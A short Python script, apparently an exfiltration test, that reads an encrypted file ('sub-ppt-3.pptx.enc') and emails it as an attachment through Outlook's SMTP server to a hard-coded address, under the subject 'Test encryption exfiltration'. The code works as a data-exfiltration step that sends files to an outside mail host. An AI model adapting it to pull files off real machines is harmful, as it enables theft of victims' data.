import os
import smtplib
from email.message import EmailMessage
from dotenv import load_dotenv

load_dotenv()

SMTP_SERVER = 'smtp-mail.outlook.com'
SMTP_PORT = 587
EMAIL_ADDRESS = 'agogeio@outlook.com'
EMAIL_PASSWORD = os.getenv('SMTP_PASSWORD')

with open('sub-ppt-3.pptx.enc', 'rb') as file:
    file_data = file.read()
    file_name = file.name

msg = EmailMessage()
msg['To'] = 'agogeio@outlook.com'
msg['From'] = EMAIL_ADDRESS
msg['Subject'] = 'Test encryption exfiltration'

msg.set_content('This is a test python email')
msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name )
#* https://docs.python.org/3/library/email.mime.html#email.mime.application.MIMEApplication
#* A subclass of MIMENonMultipart, the MIMEApplication class 
#* is used to represent MIME message objects of major type application. 
#* _data is a string containing the ***raw byte data.*** 
#* Optional _subtype specifies the MIME subtype and defaults to octet-stream.

with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()
    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    smtp.send_message(msg)